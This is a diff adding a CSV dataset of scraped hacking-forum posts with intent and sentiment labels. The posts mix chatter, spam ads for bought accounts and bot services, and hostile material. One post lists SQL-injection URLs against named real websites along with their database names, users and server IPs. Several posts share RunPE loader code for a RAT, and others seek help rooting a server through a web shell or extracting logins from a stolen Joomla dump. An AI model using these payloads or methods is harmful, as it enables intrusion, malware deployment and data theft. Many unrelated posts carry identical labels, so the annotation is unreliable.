@@ -1,0 +1,761 @@
+postid,intent,sentiment,content
+5064170,neutral,0.0454545454545455,"***CITING***[https://hackforums.net/showthread.php?pid=5064131#pid5064131]***CITING***
+You're entitled to your opinion but I'd suggest before you degrade others, suggest something better.
+
+What? Okay..."
+5064170,neutral,0.0454545454545455,"***CITING***[showthread.php?p=5057919#post5057919]***CITING***
+
+So newbies need a chance to get better ***IMG***[images/emotions/cry.gif]***IMG***"
+5064170,neutral,0.0454545454545455,did you guys even read OP's message.. he has an account with a limit of 900usd but wants to sell items ranging from 29k to 100K..so opening several account is pointless. best bet is to call eBay and discuss your business plan directly with them. make sure you speak to a manager and explain everything in detail. good luck
+5064170,neutral,0.0454545454545455,+
+5064170,neutral,0.0454545454545455,"***CITING***[https://ogusers.com/Thread-xxxtentacion-psn?pid=5043225#pid5043225]***CITING***
+Forza already owned it"
+5064170,neutral,0.0454545454545455,"Hey guys, I've been dating this boy for a month and I'm beginning to feel like he is losing feelings for me. I've haven't been feeling the same since he called me a pussy and a bastard for something I couldn't control. Should I keep him or leave him? I' love him. But he asked if we could 'do it'. Anyone able to help me?
+	
+	
+	
+	
+		
+	
+
+		
+		  ***LINK***[#likepid5064170]***LINK***
+		  0 
+		
+		
+		  ***LINK***[#dislikepid5064170]***LINK***
+		   0 
+		
+		
+		***LINK***[/viewratings.php?pid=5064170]***LINK***"
+5064170,neutral,0.0454545454545455,thanks
+5073564,neutral,0,make sure your label value / text = 0 or a number & not with any letters / symbols
+5073564,neutral,0,"Online and available for orders / deliveries!
+
+
+
+
+
+
+
+***LINK***[CHEAPEST] Twitch Prime Subs! [CLICK][https://ogusers.com/Thread-TWITCH-TOTAL-PRICE-MATCH-Subs-Followers-Views-Affiliates-More]***LINK***
+PRICE MATCH AND BEAT GUARANTEE!!!
+DISCORD -> Ha#0001
+TELEGRAM -> ***LINK***ioGvr[https://t.me/ioGvr]***LINK***
+***LINK***Click HERE for my Selly Shop and Autobuy![https://selly.gg/@mcWin]***LINK***
+
+
+
+
+
+***LINK***[CHEAPEST] Twitch Prime Subs! [CLICK][https://ogusers.com/Thread-TWITCH-TOTAL-PRICE-MATCH-Subs-Followers-Views-Affiliates-More]***LINK***
+PRICE MATCH AND BEAT GUARANTEE!!!
+DISCORD -> Ha#0001
+TELEGRAM -> ***LINK***ioGvr[https://t.me/ioGvr]***LINK***
+***LINK***Click HERE for my Selly Shop and Autobuy![https://selly.gg/@mcWin]***LINK***
+
+
+
+
+
+
+
+
+
+***LINK***[CHEAPEST] Twitch Prime Subs! [CLICK][https://ogusers.com/Thread-TWITCH-TOTAL-PRICE-MATCH-Subs-Followers-Views-Affiliates-More]***LINK***
+PRICE MATCH AND BEAT GUARANTEE!!!
+DISCORD -> Ha#0001
+TELEGRAM -> ***LINK***ioGvr[https://t.me/ioGvr]***LINK***
+***LINK***Click HERE for my Selly Shop and Autobuy![https://selly.gg/@mcWin]***LINK***
+
+
+
+
+
+***LINK***[CHEAPEST] Twitch Prime Subs! [CLICK][https://ogusers.com/Thread-TWITCH-TOTAL-PRICE-MATCH-Subs-Followers-Views-Affiliates-More]***LINK***
+PRICE MATCH AND BEAT GUARANTEE!!!
+DISCORD -> Ha#0001
+TELEGRAM -> ***LINK***ioGvr[https://t.me/ioGvr]***LINK***
+***LINK***Click HERE for my Selly Shop and Autobuy![https://selly.gg/@mcWin]***LINK***"
+5073564,neutral,0,"***CITING***[https://v3rmillion.net/showthread.php?pid=5073562#pid5073562]***CITING***
+whats the discord tag.
+you're clearly lying bud
+	
+	
+	
+	
+		
+	
+
+		
+		  ***LINK***[#likepid5073564]***LINK***
+		  0 
+		
+		
+		  ***LINK***[#dislikepid5073564]***LINK***
+		   0 
+		
+		
+		***LINK***[/viewratings.php?pid=5073564]***LINK***"
+5073274,neutral,0,"Code:***CODE***[for (int i = 5; i > 0; i--)
+{
+Label1.Text = i.ToString()
+System.Threading.Thread.Sleep(1000)
+}]***CODE***"
+5073274,neutral,0,Wo wo did you get this idea from my mudkip mtar 21 cuz pokemon are my thing !
+5073274,neutral,0,"Продам аккаунт robocraft за 300 рублей. Там премиум навсегда , много легендарок. Не обману , всё честно!!! За покупкой писать в вк- Please login or register to view links , или skype- lexa200353.
+Аккаунт идёт со стоимом!"
+5073274,neutral,0,"т008сс сказал(а) 26 Сен 2015 - 12:54:***LINK***[https://zismo.biz/index.php?app=forums&module=forums&section=findpost&pid=5073259]***LINK******QUOTE***
+
+не проще было молча мимо пройти?
+
+***QUOTE***
+а я тебе ответ дал?? хотел услышать услышал!! К чему бредо темы разводить?"
+5072350,neutral,0.0210526315789474,"I made this for a disclaimer for a rat I'm working on. So you can just get the concept of it. Also you'll need to declare CountdownVar earlier in your code..
+
+Code:***CODE***[Private Sub Countdown_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Countdown.Tick
+  CountdownVar = CountdownVar - 1
+  Select CountdownVar
+    Case Is <= 0
+    Countdown.Enabled = False
+    OK_Button.Enabled = True
+    Me.Text = ""Disclaimer""
+    Case Else
+    Me.Text = ""Disclaimer "" + Replace(""("" + Str(CountdownVar) + "")"", "" "", """")
+  End Select
+    End Sub]***CODE***"
+5072350,neutral,0.0210526315789474,There have been reports of BlamAds too - becareful
+5072350,neutral,0.0210526315789474,marry me ace
+5072350,neutral,0.0210526315789474,QA85-AMGC-GE7K-4QMS-FPZ5-L25X-DV5K-LRAX
+5071949,positive,0.0979020979020979,"Wow, seems you really have it out for me. Does appearing as if you're correcting me make you feel better about yourself? Obviously it does, otherwise you'd leave it be. I've already admitted I was wrong about the threading/timers in this case, not sure why it's being brought back up other than to start a flame war or get attention from your online peers.
+
+As to your code, both work to some extent, though mine is better IMHO because it's sexier, not a big deal.
+
+Also, ""people"" don't ridicule me, it seems you're the only one here who stalks my posts to make sure they're 100% correct haha, I still love you for it <3 It's glad to know I got a fan who's always watching my back and correcting me when I make a mistake ***IMG***[https://hackforums.net/images/smilies/cool.gif]***IMG***"
+5071949,positive,0.0979020979020979,"***CITING***[showthread.php?p=5071881#post5071881]***CITING***
+
+@***LINK***ChimiBang[https://www.mpgh.net/forum/member.php?u=458335]***LINK***
+
+When are you going to remove me from your sig when we cleared it out?"
+5071949,positive,0.0979020979020979,I think also rar.
+5071949,positive,0.0979020979020979,"Нормальный хайд, с группой."
+5071949,positive,0.0979020979020979,get some cool emails family thanks
+5071194,neutral,-0.0169491525423729,"@ OP
+
+My (noob) suggestion, if you want to use a timer , would be :
+
+- Make sure you set your timer interval to 1000
+
+-Timer:
+Code:***CODE***[If Label1.Text = 0 Then
+  Else
+    Label1.Text = Val(Label1.Text) - Val(""1"")
+  End If]***CODE***
+Should do the trick. ***IMG***[https://hackforums.net/images/smilies/blackhat.gif]***IMG***"
+5071194,neutral,-0.0169491525423729,Bumping this kawns
+5071194,neutral,-0.0169491525423729,"***CITING***[https://v3rmillion.net/showthread.php?pid=5071141#pid5071141]***CITING***
+[/quote]
+
+1. The products are made not much different and cost pretty much equal to manufacture, but women’s accessories just cost more. That is my point. 
+
+2. The whole point of my second statement was focused on political representation. That was his reply, so that’s what I assumed. Yes, there are jobs dominated by one gender. I wasn’t clearly referring to positions of power which should not be exclusive. You agree that females are equally capable. That was my entire point. 
+
+3. I agree, there are male stereotypes, but there is still plenty of social stigma against females. Many women may lie, but it’s clear that the overwhelming majority of cases is women.
+	
+	
+	
+
+novum folium.
+1000+ vouches.
+
+
+
+
+
+	
+		
+	
+
+		
+		  ***LINK***[#likepid5071194]***LINK***
+		  0 
+		
+		
+		  ***LINK***[#dislikepid5071194]***LINK***
+		   0 
+		
+		
+		***LINK***[/viewratings.php?pid=5071194]***LINK***"
+5071194,neutral,-0.0169491525423729,Если не трудно мне в личку можно
+5070865,gratitude,0.0952380952380952,"***CITING***[https://hackforums.net/showthread.php?pid=5070745#pid5070745]***CITING***
+Ah okay, thanks :) As I said, I've only used VB once, so I won't ever be 100% in VB xD Thanks for clearing that up though ***IMG***[https://hackforums.net/images/smilies/biggrin.gif]***IMG***
+
+I'll make sure to edit my 1st reply now."
+5070865,gratitude,0.0952380952380952,"after many fails, I got approved, now what can I do to start making money, is any one interrested ? nooob to CPA here, go easy with me please"
+5070865,gratitude,0.0952380952380952,"***CITING***[https://ogusers.com/Thread-STAFF-VOUCHED-TRUSTED-DEV-Death%E2%80%99s-Auto-Bumper-Big-sale?pid=5070856#pid5070856]***CITING***
+that's strange, i'll set the timer to 1 hour and 5 mins to see if it still does that
+
+Using this now
+
+
+
+
+
+
+
+Always confirm on site.
+
+***IMG***[https://i.gyazo.com/89d82261903b8427f0184c9c93ec72d4.png]***IMG***
+
+no longer death#6666 on discord.
+
+
+
+
+
+Always confirm on site.
+
+***IMG***[https://i.gyazo.com/89d82261903b8427f0184c9c93ec72d4.png]***IMG***
+
+no longer death#6666 on discord.
+
+
+
+
+
+
+
+
+
+Always confirm on site.
+
+***IMG***[https://i.gyazo.com/89d82261903b8427f0184c9c93ec72d4.png]***IMG***
+
+no longer death#6666 on discord.
+
+
+
+
+
+Always confirm on site.
+
+***IMG***[https://i.gyazo.com/89d82261903b8427f0184c9c93ec72d4.png]***IMG***
+
+no longer death#6666 on discord."
+5070745,neutral,0.0303030303030303,"Using a new thread for such a thing is obviously pointless, however, Zer0 & Aeon are right, I hope someone cleans up this thread for future people looking for a reference.
+
+@CometJack
+Code:***CODE***[For Integer i = Val(label3.Text) To 0]***CODE***
+needs to be
+Code:***CODE***[For I As Integer = Val(Label3.Text) To 0]***CODE***
+the C# got to you on declaring vars backwards,"
+5070745,neutral,0.0303030303030303,The first 151 pokemons ***IMG***[images/emotions/=_=.png]***IMG***
+5070745,neutral,0.0303030303030303,"***CITING***[goto/post?id=5070596#post-5070596]***CITING***​
+
+I do the same with my PP account. Works just fine. It's a debit card, right?
+
+Good luck with your journey!! ***IMG***[styles/default/xenforo/clear.png]***IMG***"
+5070745,neutral,0.0303030303030303,"Service Still Available!
+
+
+
+
+
+
+***LINK***[https://ogusers.com/Thread-AUTO-BUY-1-Twitch-Bot-FujiViews-Follows-Chat-bot-Proxy-Scraper-Checker-Much-More]***LINK***
+
+
+
+
+
+***LINK***[https://ogusers.com/Thread-AUTO-BUY-1-Twitch-Bot-FujiViews-Follows-Chat-bot-Proxy-Scraper-Checker-Much-More]***LINK***
+
+
+
+
+
+
+
+***LINK***[https://ogusers.com/Thread-AUTO-BUY-1-Twitch-Bot-FujiViews-Follows-Chat-bot-Proxy-Scraper-Checker-Much-More]***LINK***
+
+
+
+
+
+***LINK***[https://ogusers.com/Thread-AUTO-BUY-1-Twitch-Bot-FujiViews-Follows-Chat-bot-Proxy-Scraper-Checker-Much-More]***LINK***"
+5070745,neutral,0.0303030303030303,ok
+5074842,neutral,0.0211640211640212,"***CITING***[https://hackforums.net/showthread.php?pid=5073274#pid5073274]***CITING***
+this is pain ful, because it stops your current thread to freeze, specially if its the UI thread. *Shrugs*
+
+***QUOTE***ps3fan  Wrote:Private Sub Countdown_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Countdown.Tick
+  CountdownVar = CountdownVar - 1
+  Select CountdownVar
+    Case Is <= 0
+    Countdown.Enabled = False
+    OK_Button.Enabled = True
+    Me.Text = ""Disclaimer""
+    Case Else
+    Me.Text = ""Disclaimer "" + Replace(""("" + Str(CountdownVar) + "")"", "" "", """")
+  End Select
+    End Sub***QUOTE***
+This isn't a great way to use a Select Case, when all you need is 
+Code:***CODE***[CountdownVar = CountdownVar - 1
+
+If CountDownVar = 0 Then
+    Countdown.Enabled = False
+    OK_Button.Enabled = True
+    Me.Text = ""Disclaimer""
+ Else
+    Me.Text = ""Disclaimer "" + Replace(""("" + Str(CountdownVar) + "")"", "" "", """")
+End If
+
+End Sub]***CODE***"
+5074842,neutral,0.0211640211640212,"Oh Ah , Poor Guy , Don't have money ! Can't Buy a book ? ***IMG***[images/emotions/ohshit.gif]***IMG*** ?  ***IMG***[images/emotions/ahah.gif]***IMG*** !!
+
+---> You Are ***IMG***[https://profile.ak.fbcdn.net/hprofile-ak-snc4/71157_300923595734_1328237_n.jpg]***IMG***
+
+And Asking for money/Learning hahahahha 
+So Take ThiS From Lady Gaga ***IMG***[images/emotions/ahah.gif]***IMG***
+***IMG***[https://www.track-backs.com/images/fronts/mm%20dont%20beg.gif]***IMG***"
+5074842,neutral,0.0211640211640212,"you seem like a hard enough worker so you will definitely reach your goals.
+as i like to say, if you dont have those ""eye bleeding"" days from working on the computer for a long period of time, then you wont be successful.
+the nights where you stay up until 4 am are part of the process ***IMG***[styles/default/xenforo/clear.png]***IMG***
+your lead generation business is doing well, so i suggest that you keep doing that.
+but also test new methods at the same time. having multiple income streams is a great goal."
+3012396,neutral,0,Nor can I D:
+3012396,neutral,0,can you ********e the jar file and the new files?
+3012396,neutral,0,***CITING***[goto/post?id=3012337#post-3012337]***CITING***Может Internet Explorer?)
+3012396,neutral,0,"нужен поручитель
+354404878"
+3012396,neutral,0,:ty
+2909001,neutral,-0.0545454545454545,"***CITING***[https://hackforums.net/showthread.php?pid=2907810#pid2907810]***CITING***
+yes and my ass starts to bleed !!!
+after researching more, the problem is in the RunPE.dll, I'll try to find some tutorials on how to make a dll in vb6.
+For those interested here's my project in vb.net and the begining of the dll in vb6
+
+***LINK***http://www.multiupload.com/BHDEEUWDLZ[http://www.multiupload.com/BHDEEUWDLZ]***LINK***"
+2909001,neutral,-0.0545454545454545,"Блядь,думал про 1 , но написал 2 . ДОЛБАЕБ...."
+2909001,neutral,-0.0545454545454545,"банят за накрутку, проверенно.
+интересно бы узнать по каким признакам лочат. только не догадки, а реальную информацию получить."
+2908919,neutral,0,***CITING***[https://hackforums.net/showthread.php?pid=2904784#pid2904784]***CITING***Thats what I said. xD
+2908919,neutral,0,"Very interested. As I understand it these are web 2.0 profiles, correct? Thanks in advance."
+2908919,neutral,0,"Помогите порутать систему.
+Есть WSO. Могу лить файлы, смотреть структуру, но не могу писать выше своего каталога и компилить.
+Как быть? Ядро 2.6.26"
+2908919,neutral,0,"nice email for any pokemon fans, bump
+
+
+
+
+
+
+***LINK***
+
+Autobuy - $4.00 15 Year Steam Badge Accounts 
+
+(7 digit, OGE, 5+10 Year CS:GO coins, OGE)[https://ogusers.com/Thread-14-YEAR-BADGE-ACCOUNTS-7-DIGIT-5-YR-CS-GO-COIN-only-5-cheapest-on-site]***LINK***
+
+
+***LINK***
+
+Autobuy - $3.00 Aged 2011 Twitter accounts
+
+(100% secure, OGE, with Tweets)[https://ogusers.com/Thread-AUTOBUY-2011-Aged-Twitter-Accounts-3-each]***LINK***
+
+
+
+
+
+***LINK***
+Autobuy - $4.00 15 Year Steam Badge Accounts 
+(7 digit, OGE, 5+10 Year CS:GO coins, OGE)[https://ogusers.com/Thread-14-YEAR-BADGE-ACCOUNTS-7-DIGIT-5-YR-CS-GO-COIN-only-5-cheapest-on-site]***LINK***
+
+
+***LINK***
+Autobuy - $3.00 Aged 2011 Twitter accounts
+(100% secure, OGE, with Tweets)[https://ogusers.com/Thread-AUTOBUY-2011-Aged-Twitter-Accounts-3-each]***LINK***
+
+
+
+
+
+
+
+***LINK***
+
+Autobuy - $4.00 15 Year Steam Badge Accounts 
+
+(7 digit, OGE, 5+10 Year CS:GO coins, OGE)[https://ogusers.com/Thread-14-YEAR-BADGE-ACCOUNTS-7-DIGIT-5-YR-CS-GO-COIN-only-5-cheapest-on-site]***LINK***
+
+
+***LINK***
+
+Autobuy - $3.00 Aged 2011 Twitter accounts
+
+(100% secure, OGE, with Tweets)[https://ogusers.com/Thread-AUTOBUY-2011-Aged-Twitter-Accounts-3-each]***LINK***
+
+
+
+
+
+***LINK***
+
+Autobuy - $4.00 15 Year Steam Badge Accounts 
+
+(7 digit, OGE, 5+10 Year CS:GO coins, OGE)[https://ogusers.com/Thread-14-YEAR-BADGE-ACCOUNTS-7-DIGIT-5-YR-CS-GO-COIN-only-5-cheapest-on-site]***LINK***
+
+
+***LINK***
+
+Autobuy - $3.00 Aged 2011 Twitter accounts
+
+(100% secure, OGE, with Tweets)[https://ogusers.com/Thread-AUTOBUY-2011-Aged-Twitter-Accounts-3-each]***LINK***"
+2908919,neutral,0,"people seem to be using gomovies recently so i'd suggest that site.
+	
+	
+	
+	
+		
+	
+***IMG***[https://v3rmillion.net/s1/adp/get/load2.gif]***IMG******LINK***[#likepid2908919]***LINK***    ***LINK***[#viewpid2908919]***LINK***    ***LINK***[#dislikepid2908919]***LINK***"
+2908919,neutral,0,Tks bro very good
+2907810,neutral,-0.166666666666667,"***CITING***[https://hackforums.net/showthread.php?pid=2907765#pid2907765]***CITING***
+OMG its spreading already !! We are screwed !! xD"
+2907810,neutral,-0.166666666666667,"***IFRAME***[about:blank]***IFRAME***
+
+
+
+
+
+***CITING***[showthread.php?p=2907607#post2907607]***CITING***
+
+thank you drake ;D"
+2907810,neutral,-0.166666666666667,"Дроу, дай акк)"
+2907810,neutral,-0.166666666666667,"а как вытащить из дампа joomlы логин пароль, можно ещё и фио с телефоном ?
+там бардак такой в файле..."
+2907810,neutral,-0.166666666666667,"Looks nice, may buy it. Vouch.
+	
+	
+	
+
+not active
+
+
+	
+		
+	
+***IMG***[https://v3rmillion.net/s1/adp/get/load2.gif]***IMG******LINK***[#likepid2907810]***LINK***    ***LINK***[#viewpid2907810]***LINK***    ***LINK***[#dislikepid2907810]***LINK***"
+2907634,positive,-0.125,"My head hurts, this is all confusing lol"
+2907634,positive,-0.125,"Up
+Ваше сообщение слишком короткое. Оно должно быть не менее 4 символов."
+2907634,positive,-0.125,"***CITING***[https://ogusers.com/Thread-Gamertag-Swap--186321?pid=2907627#pid2907627]***CITING***
+Oh I saw that, just wanna buy his turbo very bad :("
+2907634,positive,-0.125,"***CITING***[https://v3rmillion.net/showthread.php?pid=2907624#pid2907624]***CITING***
+
+no, just listen to what others say instead of just blatantly & ignorantly stating ""i dont give a fuck""
+	
+	
+	
+	
+		
+	
+***IMG***[https://v3rmillion.net/s1/adp/get/load2.gif]***IMG******LINK***[#likepid2907634]***LINK***    ***LINK***[#viewpid2907634]***LINK***    ***LINK***[#dislikepid2907634]***LINK***"
+2907634,positive,-0.125,может каких-то функций дополнительных простеньких добавить? что скажете?
+3012336,positive,0.333333333333333,I just can't get this to work lol xD
+3012336,positive,0.333333333333333,"Ill offer 30$ aus  for tat all i got :l
+or trade u a cpt 1 no perms i bought it and it still has same stats and all info"
+3012336,positive,0.333333333333333,"*BUMP* 
+
+  I really need it done asap because I'm losing conversions as 'we speak' and I can't get in touch with Leadbolt's staff now because I think we are not in the same time zone or something so my e-mail will be found only in the morning."
+3012336,positive,0.333333333333333,Много жирных)
+3012336,positive,0.333333333333333,"Wat do the cookies do? Also it never creates or favorites like any accounts for me ***IMG***[https://v3rmillion.net/images/smilies/new/undecided.png]***IMG***
+	
+	
+	
+	
+		
+	
+***IMG***[https://v3rmillion.net/s1/adp/get/load2.gif]***IMG******LINK***[#likepid3012336]***LINK***    ***LINK***[#viewpid3012336]***LINK***    ***LINK***[#dislikepid3012336]***LINK***"
+2896725,neutral,0,I can never find the entry point for a RunPE DLL.
+2896725,neutral,0,"""Since I entered politics, I have chiefly had men's views confided to me  privately. Some of the biggest men in the United States, in the field of  commerce and manufacture, are afraid of something. They know that there is a  power somewhere so organized, so subtle, so watchful, so interlocked, so  complete, so pervasive, that they had better not speak above their breath when  they speak in condemnation of it.""----President  Woodrow Wilson (in The New Freedom, 1913)
+
+I think he was speaking of Google..."
+2896725,neutral,0,"***CITING***[about:blank]***CITING***Да ты уже задолбал всех рекламить в каждой теме свой говноспаммер!
+
+Кастати IMtale ничем не хуже твоего работает.
+
+И ICQ HooK v8.3.0"" давно взломана и в паблике лежит рабочая - за что спасибо Apocalypse ***IMG***[styles/default/xenforo/clear.png]***IMG***"
+2896725,neutral,0,"Aw you’re so nice (:
+
+
+
+
+
+
+Did all the favors, they never repaid me 
+
+
+It worked in my favor, cause nobody saved me.
+
+
+
+
+
+Did all the favors, they never repaid me 
+
+
+It worked in my favor, cause nobody saved me.
+
+
+
+
+
+
+
+Did all the favors, they never repaid me 
+
+
+It worked in my favor, cause nobody saved me.
+
+
+
+
+
+Did all the favors, they never repaid me 
+
+
+It worked in my favor, cause nobody saved me."
+2896725,neutral,0,"you guys are rking the devs so badly, how funny this is going ***IMG***[https://v3rmillion.net/images/smilies/new/biggrin.png]***IMG***
+	
+	
+	
+
+
+
+
+
+	
+		
+	
+***IMG***[https://v3rmillion.net/s1/adp/get/load2.gif]***IMG******LINK***[#likepid2896725]***LINK***    ***LINK***[#viewpid2896725]***LINK***    ***LINK***[#dislikepid2896725]***LINK***"
+2896725,neutral,0,What is nfa and sfa?
+2896408,neutral,0.0105263157894737,"Add RunPE.dll in the resources, find notepad.exe and put it in the same folder as your application and try to do something like this :
+
+Code:***CODE***[Imports System.Runtime.InteropServices
+
+Module Module1
+    Public processZ As String = Process.GetCurrentProcess().MainModule.FileName
+
+    Sub Main()
+        Try
+            System.IO.File.WriteAllBytes(""RunPE.dll"", My.Resources.RunPE)
+        Catch ex As Exception
+
+        End Try
+        Dim oFile1 As System.IO.FileInfo
+        oFile1 = New System.IO.FileInfo(""notepad.exe"")
+
+        Dim oFileStream1 As System.IO.FileStream = oFile1.OpenRead()
+        Dim lBytes1 As Long = oFileStream1.Length
+
+        If (lBytes1 > 0) Then
+            Dim fileData(lBytes1 - 1) As Byte
+            oFileStream1.Read(fileData, 0, lBytes1)
+            RunPE(fileData, processZ)
+            oFileStream1.Close()
+        End If
+    End Sub
+
+    <DllImport(""RunPE.dll"")> _
+    Public Sub RunPE(ByRef bvBuff() As Byte, ByRef hProc As String)
+    End Sub
+
+End Module]***CODE***
+modify 
+
+Code:***CODE***[<DllImport(""RunPE.dll"")> _
+    Public Sub RunPE(ByRef bvBuff() As Byte, ByRef hProc As String)
+    End Sub]***CODE***
+with the runPE function that is in your vb6 dll
+
+I tried like that but the problem is : can't find entrypoint...."
+2896408,neutral,0.0105263157894737,"xD I Think That No :s
+
+I can Make a Screenie Right Now. But I Dont Like to hack, I only hack for gaining Soldier and Scout Badges :P"
+2896408,neutral,0.0105263157894737,"Нужны Java программист. Бюджет 3тыс руб. Сроки: 1неделя
+
+ТЗ в привате. Оплата вперед ТОЛЬКО при наличии хороших гарантий. Хороший БЛ, Атт
+
+Кто свободен напишите в асю:
+
+67172838
+
+Jabber: maroder@xmpp.ru"
+2896408,neutral,0.0105263157894737,Beg needs to be more HQ
+2895721,gratitude,0.0769230769230769,"Thanks guys, i will mess with the dll a bit more and try your methods and let everyone know how well it works, thanks again ;D"
+2895721,gratitude,0.0769230769230769,"if u doing zombies or SP go to options troll there by look at the option u see a little box wich says enable console just check it and walla maybe im wrong well i didnt play WAW
+
+oh and btw (im to lazy to edit) turn on ""sv_cheats 1"" if u want to cheat in multi or something"
+2895721,gratitude,0.0769230769230769,Александр Кириллов
+2895721,gratitude,0.0769230769230769,"Немного американщины =/
+
+Site:adenamontessori.us
+
+PR=2
+
+Inject
+
+Code:
+_ttp://adenamontessori.us/product.php?cid=4[COLOR=Magenta]+and+substring((@@version),1,1)=4[/COLOR] 
+Version:4.1.24-max-log
+Database:josephbiz
+User:josephbiz@68.178.254.81
+
+-----------------------------------------------------
+-----------------------------------------------------
+
+Site:www.ci.bartlesville.ok.us
+
+PR=5
+
+Inject
+
+Code:
+_ttp://www.ci.bartlesville.ok.us/category.php?cat=1041[COLOR=Magenta]+and+substring((@@version),1,1)=4[/COLOR]
+Version:4.0.30-max-log
+Database:pendergraphics
+User:pendergraphics@68.178.254.114
+
+-----------------------------------------------------
+-----------------------------------------------------
+
+Site:www.simcom.us
+
+PR=2
+
+Inject
+
+Code:
+ _ttp://www.simcom.us/product_detail.php?cid=1&pid=14[COLOR=Magenta]+and+1=2+union+select+1,2,version(),database(),user(),6,7,8,9,10,11,12,13,14,15[/COLOR]
+Version:4.0.27-max-log
+Database:db295004332
+User:dbo295004332@74.208.122.71"
+2895721,gratitude,0.0769230769230769,"welcome, enjoy your stay x
+
+
+
+
+
+
+Steam: ***LINK***/id/loveisland[https://steamcommunity.com/id/loveisland]***LINK*** Discord: adom#4144
+@***LINK***Tommi[Tommi]***LINK*** I love you xo @***LINK***abc2000[abc2000]***LINK***
+
+
+
+
+
+Steam: ***LINK***/id/loveisland[https://steamcommunity.com/id/loveisland]***LINK*** Discord: adom#4144
+@***LINK***Tommi[Tommi]***LINK*** I love you xo @***LINK***abc2000[abc2000]***LINK***
+
+
+
+
+
+
+
+Steam: ***LINK***/id/loveisland[https://steamcommunity.com/id/loveisland]***LINK*** Discord: adom#4144
+@***LINK***Tommi[Tommi]***LINK*** I love you xo @***LINK***abc2000[abc2000]***LINK***
+
+
+
+
+
+Steam: ***LINK***/id/loveisland[https://steamcommunity.com/id/loveisland]***LINK*** Discord: adom#4144
+@***LINK***Tommi[Tommi]***LINK*** I love you xo @***LINK***abc2000[abc2000]***LINK***"
+2895721,gratitude,0.0769230769230769,"relax dud just draw a circle and youll be safe from the sea bear
+	
+	
+	
+	
+		
+	
+***IMG***[https://v3rmillion.net/s1/adp/get/load2.gif]***IMG******LINK***[#likepid2895721]***LINK***    ***LINK***[#viewpid2895721]***LINK***    ***LINK***[#dislikepid2895721]***LINK***"
+2895721,gratitude,0.0769230769230769,lets have a look
+2895699,neutral,0.0467289719626168,"Ok heres the steps for calling the functions:
+
+Call LoadLibrary(""mydll.dll"") which will give you a HMODULE to the loaded DLL
+
+Call GetProcAddress(handleReturnedFromLoadLibrary, ""MyFunctionName"") which will return a function pointer to the function requested
+
+Call FreeLibrary(handleReturnedFromLoadLibrary) to free the loaded DLL, once you have finished using its functions
+
+
+***LINK***MSDN - LoadLibrary[https://msdn.microsoft.com/en-us/library/ms684175%28VS.85%29.aspx]***LINK***
+***LINK***MSDN - GetProcAddress[https://msdn.microsoft.com/en-us/library/ms683212%28VS.85%29.aspx]***LINK***
+***LINK***MSDN - FreeLibrary[https://msdn.microsoft.com/en-us/library/ms683152%28VS.85%29.aspx]***LINK***
+
+As for calling them from .NET I'm not sure, I know it can be done though.
+***LINK***This[http://www.pinvoke.net/]***LINK*** might be able to help you acheive it.
+***LINK***This[https://www.daniweb.com/forums/thread117677.html]***LINK*** also will help you."
+2895699,neutral,0.0467289719626168,"7 fiverr sites? does it include fiverr? i'm just asking this, because the clones are a total waste of time, you hardly can get any sales there, it's not really your fault, it's because of the lack of buying traffic"
+2895699,neutral,0.0467289719626168,"ищу поставщика соксов
+открытый 25 порт, чек на RBL, адекватный тест
+потребление от 3-4 тыщ до 10-15 и более.
+Обращаться в ЛС"
+2895699,neutral,0.0467289719626168,"@***LINK***kkk[kkk]***LINK*** get on these replies u fuck
+
+
+
+
+
+
+steamcommunity.com/id/compass/
+weheartit.com/tom
+last.fm/user/tommi
+
+
+
+
+
+
+steamcommunity.com/id/compass/
+weheartit.com/tom
+last.fm/user/tommi
+
+
+
+
+
+
+
+
+steamcommunity.com/id/compass/
+weheartit.com/tom
+last.fm/user/tommi
+
+
+
+
+
+
+steamcommunity.com/id/compass/
+weheartit.com/tom
+last.fm/user/tommi"
+2895688,neutral,0,"***CITING***[https://hackforums.net/showthread.php?pid=2895296#pid2895296]***CITING***
+in your project properties go to Resources/Add Resource/Add existing file and browse your runpe.dll
+then to copy it to the harddrive you use :
+Code:***CODE***[System.IO.File.WriteAllBytes(thepath & ""RunPE.dll"", My.Resources.RunPE)]***CODE***"
+2895688,neutral,0,ffs.. why is whole COD section here
+2895688,neutral,0,sorry I m not hijacking your thread . if you found someone feel free to PM me the contact details of service provider.I am looking for similiar autoblog setup service . anyone experienced in autoblog installation can PM me . i need to setup 20 autoblogs . newbie stay away . only experienced autoblog installer should PM me ***IMG***[styles/default/xenforo/clear.png]***IMG***
+2895688,neutral,0,Есть предложения?
+2895688,neutral,0,"Взял акков, недорого и оперативно!"
+2895688,neutral,0,Купил активацию. Все прошло быстро и удачно. Доволен!
+2895635,neutral,0.06,"***CITING***[https://hackforums.net/showthread.php?pid=2895603#pid2895603]***CITING***
+Okay sounds simple (not) anychance u can help me with this or link me to a tut etc, im not so advanced in .net, slowly getting there ;D
+
+Edit: t0fx replied saying this ain't working, any idea's i think my little idea wont work =/"
+2895635,neutral,0.06,How about not bumping 2 month old topics?
+2895635,neutral,0.06,"Отправил, ***LINK***@Pinchi[https://lolzteam.net/members/43825/]***LINK***"
+2895635,neutral,0.06,Бутылку Мартини или ещё какого нибудь вермута))
+2895635,neutral,0.06,Bumping thiss
+2895635,neutral,0.06,tks
